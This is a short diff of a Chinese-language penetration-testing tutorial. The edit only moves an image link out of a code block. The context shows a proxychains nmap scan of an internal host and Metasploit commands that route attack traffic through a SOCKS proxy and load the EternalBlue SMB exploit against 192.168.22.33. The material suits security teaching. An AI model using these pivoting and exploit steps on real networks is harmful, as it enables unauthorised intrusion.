@@ -184,13 +184,13 @@ proxychains nmap -sT -Pn -n 192.168.22.33
 
 通过代理扫描发现内网机器`192.168.22.33`开放了445端口（SMB）。可以进一步使用MSF模块通过Socks代理进行攻击。
 
+
+![](img/7b6683aa6dcc3844b52ce4c4cc321b11_42.png)
+
 ```bash
 # 在MSF中设置全局代理，使MSF发起的攻击流量也走Socks通道
 setg Proxies socks5:127.0.0.1:1080
 setg ReverseAllowProxy true # 允许反向连接通过代理
-
-![](img/7b6683aa6dcc3844b52ce4c4cc321b11_42.png)
-
 # 使用SMB漏洞模块
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 192.168.22.33
